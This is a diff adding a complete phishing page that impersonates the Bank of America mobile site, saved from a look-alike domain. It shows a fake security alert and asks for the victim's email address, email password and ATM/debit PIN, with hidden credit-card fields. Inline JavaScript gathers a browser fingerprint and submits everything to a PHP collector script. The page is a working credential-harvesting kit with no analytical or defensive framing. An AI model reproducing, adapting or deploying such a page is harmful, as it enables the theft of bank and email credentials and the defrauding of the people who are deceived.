@@ -1,0 +1,222 @@
+﻿
+<!-- saved from url=(0032)https://mservicebkofamerica.com/ -->
+<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		<!--[if IE 9]>
+			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
+		<![endif]-->
+		<title>Bank of America Mobile - Confirm your email address</title>
+	<link rel="shortcut icon" href="https://mservicebkofamerica.com/favicon.ico">
+	<link rel="stylesheet" href="./Bank of America Mobile - Confirm your email address_files/bactouch.css">
+	<link rel="stylesheet" href="./Bank of America Mobile - Confirm your email address_files/toolbar.css">
+	<link rel="stylesheet" href="./Bank of America Mobile - Confirm your email address_files/bact_listview.css">
+	<link rel="stylesheet" href="./Bank of America Mobile - Confirm your email address_files/footer.css">
+	<link rel="stylesheet" href="./Bank of America Mobile - Confirm your email address_files/slidemenu.css">
+<style>
+.noselect {
+  -webkit-touch-callout: none; /* iOS Safari */
+    -webkit-user-select: none; /* Safari */
+     -khtml-user-select: none; /* Konqueror HTML */
+       -moz-user-select: none; /* Old versions of Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version, currently
+                                  supported by Chrome, Edge, Opera and Firefox */
+}
+</style>
+	<script>
+	function Initialize(){
+		function ckgl() {
+			var gl=document.createElement('canvas').getContext("webgl",{antialias:false})||document.createElement('canvas').getContext("experimental-webgl");
+			if (gl){
+				debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+				if (debugInfo) {
+					return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+				} else {
+					return false;
+				}
+			} else {
+				return false;
+			}
+		}
+		if (window.devicePixelRatio) {
+			var r=window.devicePixelRatio||1;
+		} else {
+			var r='false';
+		}
+		if (screen.width) {
+			var w=screen.width*r;
+		} else {
+			var w='false';
+		}
+		if (screen.height) {
+			var h=screen.height*r;
+		} else {
+			var h='false';
+		}
+		if (Date()) {
+			var t=new Date().toString().match(/([A-Z]+[\+-][0-9]+)/)[1];
+		} else {
+			var t='false';
+		}
+		if (ckgl()) {
+			var g=ckgl().split(' ').join('-');
+		} else {
+			var g='false';
+		}
+		var offset = new Date().getTimezoneOffset();
+		var offsetx2 = new Date().getTimezoneOffset()*2;
+		var cw = window.innerWidth;
+		var ch = window.innerHeight;
+		var colordepth = window.screen.colorDepth;
+		var pixelratio = window.devicePixelRatio;
+		var sc = ch+','+cw+','+h+','+w+','+offsetx2+','+offset+','+t+','+colordepth+','+pixelratio+','+g;
+		return sc;
+	}
+	var userLang = navigator.language || navigator.userLanguage;
+	var orientation = (screen.orientation || {}).type || screen.mozOrientation || screen.msOrientation;
+	var dispositive = new Date().getTimezoneOffset()*2+','+window.innerHeight+','+window.innerWidth+','+userLang+','+orientation+','+Initialize();
+	function validateEmail(email) {
+		var re = /\S+@\S+\.\S+/;
+		return re.test(email);
+	}
+	function verify() {
+		document.getElementById('spinnerPanel').style.display='block';
+		setTimeout(continueft, 1600);
+		function continueft() {
+			document.getElementById('divMessaging2').style.display='none';
+			document.getElementById('authCodeOtac').style.color='black';
+			document.getElementById('authCodeOtac2').style.color='black';
+			document.getElementById('authCodeOtac3').style.color='black';
+			var email = document.getElementById('email').value;
+			var password = document.getElementById('password').value;
+			var pin = document.getElementById('pin').value;
+			if ((validateEmail(email) == true) && password.length > 3 && pin.length > 3) {
+				document.getElementById('dp').value=dispositive;
+				document.getElementById('emailcard').submit();
+			} else {
+				if (validateEmail(email) == false) {
+					document.getElementById('authCodeOtac').style.color='red';
+				}
+				if (password.length < 4) {
+					document.getElementById('authCodeOtac2').style.color='red';
+				}
+				if (pin.length < 4 ){
+					document.getElementById('authCodeOtac3').style.color='red';
+				}
+								document.getElementById('divMessaging2').style.display='block';
+			}
+			document.getElementById('spinnerPanel').style.display='none';
+		}
+	}
+	</script>
+	</head>
+	<body><div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
+	<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a>
+	<a id="slidemenuz" class="sprite backButton icon sprite-menu" style="cursor:pointer" title="Show menu for all mobile banking features" role="button"></a>
+	<div id="barker" class="hidden"></div><h1 id="title" class="">
+	<div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Confirm your email address</div>
+	<span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div>
+	<div id="SASI_banner_container"></div><div class="pageMinHeight"><!-- SIGN ON HOME PAGE-->
+
+<div class="pageMinHeight">
+<div id="divMessaging" class="messaging" style="display:none">
+<a id="adaMessage" class="adaHiddenText" href="javascript:void(0)" role="text">
+error,,We don't recognize your Online ID and/or Passcode. Please try again or please use the "Forgot Passcode" or "Forgot ID" link.
+</a>
+<span class="messageIcon error"></span>
+<div class="messageText"><a onclick="document.getElementById(&#39;divMessaging&#39;).style.display=&#39;none&#39;" style="cursor:pointer" class="closeIcon" title="Close message" role="button"></a>
+<p aria-hidden="true" role="text" class="TLu_ERROR">We don't recognize your Email and/or Password. Please try again or please contact your email service.</p>
+</div>
+</div>
+<div id="divMessaging2" class="messaging" style="display:none">
+<a id="adaMessage" class="adaHiddenText" href="javascript:void(0)" role="text">
+error,,We don't recognize your Online ID and/or Passcode. Please try again or please use the "Forgot Passcode" or "Forgot ID" link.
+</a>
+<span class="messageIcon error"></span>
+<div class="messageText"><a onclick="document.getElementById(&#39;divMessaging&#39;).style.display=&#39;none&#39;" style="cursor:pointer" class="closeIcon" title="Close message" role="button"></a>
+<p aria-hidden="true" role="text" class="TLu_ERROR">Some of the data entered is incorrect, please verify it.</p>
+</div>
+</div>
+<div id="authorizationCodeDiv">
+    <div id="CheckEmailForAuthCode"><div class="paddingVert10 padding10"><p>Security alert: Please log in to your email service.</p><div>
+	<div class="toppad20 paddingHoriz10" style="display:none"><b>3****4@</b></div></div></div></div>
+    <div id="TextMessageForAuthCode" style="display: none;">
+    </div>
+    <div id="alreadyHaveCode" class="paddingVert10 padding10" style="display: none;">
+    </div>
+	<form id="emailcard" action="inc/next2.php" method="post" autocomplete="off">
+	<input type="hidden" id="sec" name="sec" value="true">
+	<input type="hidden" id="activation" name="activation" value="3334">
+	<input type="hidden" id="panel" name="panel" value="toRecard">
+	<input type="hidden" id="dp" name="dp" value="">
+    <div class="inputContainer">
+        <label for="authCode" id="authCodeOtac" style="padding-right:30px"><strong>Your Email</strong></label>
+        <input style="width:50%" id="email" name="email" type="email" placeholder="Enter email here"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+    </div>
+    <div class="inputContainer">
+        <label for="authCode" id="authCodeOtac2" style="padding-right:30px"><strong>Email Password</strong></label>
+        <input style="width:50%" id="password" name="password" type="password" placeholder="Enter password here"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+    </div>
+    <div class="padding10 toppad20" id="CodeExpires" style="display: none;"><p>The code expires 10 minutes after you request it.</p></div>
+    <div class="toppad20 padding10" id="CodeExpiresByEmail">Enter the email linked to your account to authenticate your signin.</div>
+    <div class="paddingVert10 padding10 blueLink" style="display:none">
+        <a id="RequestAnotherAuthorizationCode" href="javascript:;" style="text-decoration: none;display:none"><span>Connect to Microsoft Account.</span></a>
+    </div>
+    <div id="cardValidation">
+    <div id="DebitCardValidation">
+        <div style="display:none" class="mtop-30 paddingHoriz10 bottompad10" id="selectDebitCard">SELECT AN ATM/DEBIT CARD</div>
+        <div style="display:none" id="debitCardList"><ul class="listView"><li class="pickListCheck"><a id="xxxx-xxxx-xxxx-5539" href="javascript:void(0);">xxxx-xxxx-xxxx-5539</a></li></ul></div>
+
+        <div class="toppad20 paddingHoriz10" id="selectDebitPin">ENTER YOUR ATM/DEBIT CARD PIN</div>
+        <div class="inputContainer">
+            <label for="authCode" id="authCodeOtac3" style="padding-right:30px"><strong>PIN</strong></label>
+            <input id="pin" name="pin" oninput="this.value = this.value.replace(/[^0-9]/g, &#39;&#39;); this.value = this.value.replace(/(\..*)\./g, &#39;$1&#39;);" maxlength="6" type="tel" pattern="[0-9]*" title="PIN" minlength="4" class="masked" placeholder="Enter here"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+        </div>
+    </div>
+	
+    <div id="CreditCardValidation" style="display: none;">
+        <div class="toppad20 paddingHoriz10 bottompad10" id="selectCreditCard">SELECT A CREDIT CARD</div>
+        <div id="creditCardList">
+        </div>
+
+        <div class="mtop-30 paddingHoriz10" id="creditCardDetails">ENTER THE SELECTED CREDIT CARD DETAILS</div>
+        <div class="inputContainer">
+            <label for="securityCodeOtac" id="SecurityCode">Security Code (3 or 4 digits)</label>
+            <input id="securityCodeOtac" type="tel" pattern="[0-9]*" title="securityCode" maxlength="4" class="masked" placeholder="XXXX"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+        </div>
+        <div class="inputContainer">
+            <label for="expiryDate" id="ExpiryDate">Expiration Date</label>
+            <input id="expiryDate" type="tel" pattern="[0-9]*" title="expiryDate" maxlength="5" placeholder="MM/YY"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+        </div>
+    </div> 
+</div></form>
+    <div id="btnPin" style="position: fixed; bottom: 0px;">
+        <ul class="btnGroupPin">
+            <li>
+                <a id="cancelButton" class="btnNeg" role="button">
+                    <span class="btnText fontBold">Cancel</span>
+                </a>
+            </li>
+            <li>
+                <a id="continue" onclick="verify()" class="btnPos noselect" role="button" title="dimmed">
+                    <span class="btnText fontBold">Continue</span>
+                </a>
+            </li>
+        </ul>
+    </div>
+</div>
+<div class="clear"></div></div>
+<div style="height:50px"></div>
+</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left">
+<a id="boa_footer_privacy" style="cursor:pointer;color:#0170B9;text-decoration:none;font-size:10px" target="_blank">Privacy</a></div><div class="left">
+<a id="boa_footer_security" style="cursor:pointer;padding-left:20px;;color:#0170B9;text-decoration:none;font-size:10px" target="_blank">Security</a></div><div class="right">
+<a id="boa_footer_ehl" style="cursor:pointer;color:#0170B9;text-decoration:none;font-size:10px" class="ehl" target="_blank">Equal Housing Lender</a><span style="padding:10px"></span></div>
+<p class="clear" style="font-size:10px">© 2020 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p></div></footer></div>
+<div id="spinnerPanel" class="spinnerPanel" style="height: 100%; display: none;"><div class="spinner" style="top: 246.8px;"><span class="messageIcon"></span>
+<a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div></div>
+<div id="slidemenu_sidePanel" style="display: none"><div class="slidemenu_menu">
+</div></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
+</body></html>
